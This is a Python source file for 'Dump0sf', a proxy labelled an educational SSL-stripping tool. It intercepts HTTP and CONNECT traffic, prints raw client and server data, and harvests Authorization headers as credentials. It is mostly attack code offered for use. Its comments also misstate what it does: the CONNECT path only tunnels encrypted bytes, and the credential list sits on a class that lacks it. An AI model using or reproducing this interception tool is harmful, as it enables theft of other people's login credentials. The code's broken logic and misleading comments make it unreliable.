import socket
import ssl
import threading
import http.server
import logging
import urllib
import base64
import re

# Dump0sf: SSL Stripping Proxy (Educational Purposes)
class Dump0sf:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.server = None
        self.credentials = []

    def start(self):
        """Starts the proxy server on the specified host and port."""
        print(f"[*] Starting Dump0sf Proxy on {self.host}:{self.port}")
        self.server = http.server.HTTPServer((self.host, self.port), self.RequestHandler)
        self.server.serve_forever()

    class RequestHandler(http.server.BaseHTTPRequestHandler):
        def do_CONNECT(self):
            """Handle HTTPS requests (SSL stripping)."""
            try:
                # This is where SSL stripping occurs, by establishing a plain HTTP connection
                print(f"[*] HTTPS Request Detected from {self.client_address}")
                target_host, target_port = self.path.split(":")
                target_port = int(target_port)
                
                # Create the plain socket connection
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_host, target_port))
                
                # Send the response to the client saying it's okay to continue
                self.send_response(200, "Connection Established")
                self.send_header("Proxy-Agent", "Dump0sf Proxy")
                self.end_headers()

                # Now, forward the raw traffic (stripping the SSL/TLS layer)
                self.proxy_connection(client_socket)
            except Exception as e:
                print(f"[!] Error in handling CONNECT: {e}")
                self.send_response(500)
                self.end_headers()

        def do_GET(self):
            """Handle GET requests (HTTP method)."""
            self.handle_http_request()

        def do_POST(self):
            """Handle POST requests (HTTP method)."""
            self.handle_http_request()

        def do_HEAD(self):
            """Handle HEAD requests (HTTP method)."""
            self.handle_http_request()

        def handle_http_request(self):
            """Handle HTTP requests (GET, POST, HEAD, etc.)."""
            try:
                print(f"[*] HTTP Request from {self.client_address}")
                target_host = self.headers['Host']

                # Create a plain HTTP connection to the target server
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_host, 80))  # Always use port 80 for HTTP (no SSL)

                # Forward the original request to the server
                request_data = self.requestline + "\r\n"
                for header, value in self.headers.items():
                    request_data += f"{header}: {value}\r\n"
                request_data += "\r\n"
                client_socket.sendall(request_data.encode())

                # Read the response from the server
                response_data = client_socket.recv(1024)
                
                # Print raw response for inspection
                print(f"Raw data from server: {response_data.decode(errors='ignore')}")
                
                # Forward the response back to the client
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(response_data)

                # Close the client-server connection
                client_socket.close()

            except Exception as e:
                print(f"[!] Error in HTTP request handling: {e}")
                self.send_response(500)
                self.end_headers()

        def proxy_connection(self, client_socket):
            """Handles the raw forwarding of data from client to server and vice versa."""
            try:
                # Setup for bidirectional data forwarding
                while True:
                    data_from_client = self.rfile.read(1024)
                    if data_from_client:
                        # Print raw data for inspection
                        print(f"Raw data from client: {data_from_client.decode(errors='ignore')}")
                        
                        # Check for credentials in the data (just a basic check for "Authorization")
                        self.extract_credentials(data_from_client)
                        
                        # Forward the data to the server
                        client_socket.sendall(data_from_client)
                        
                        # Read the server's response
                        data_from_server = client_socket.recv(1024)
                        if data_from_server:
                            # Print raw data for inspection
                            print(f"Raw data from server: {data_from_server.decode(errors='ignore')}")
                            
                            # Forward the server's response to the client
                            self.wfile.write(data_from_server)
                    else:
                        break
            except Exception as e:
                print(f"[!] Error in proxy connection: {e}")

        def extract_credentials(self, data):
            """Extract credentials from the HTTP request and add them to the credentials list."""
            try:
                # Look for basic auth or token-based authorization
                auth_header = re.search(r"(Authorization: .*?)\r\n", data.decode(errors="ignore"))
                if auth_header:
                    credentials = auth_header.group(1)
                    self.credentials.append(credentials)
                    print(f"[*] Credentials Found: {credentials}")
            except Exception as e:
                print(f"[!] Error extracting credentials: {e}")
        
        def log_message(self, format, *args):
            """Override log_message to suppress automatic logging by BaseHTTPRequestHandler."""
            return

    def print_credentials(self):
        """Display the list of credentials extracted."""
        if self.credentials:
            print("[*] Extracted Credentials:")
            for credential in self.credentials:
                print(credential)
        else:
            print("[*] No credentials found.")

if __name__ == "__main__":
    proxy = Dump0sf()
    threading.Thread(target=proxy.start).start()

    # The proxy will continue running in the background, handling incoming requests.
    # To check the credentials it has intercepted, run this after some time:
    # proxy.print_credentials()
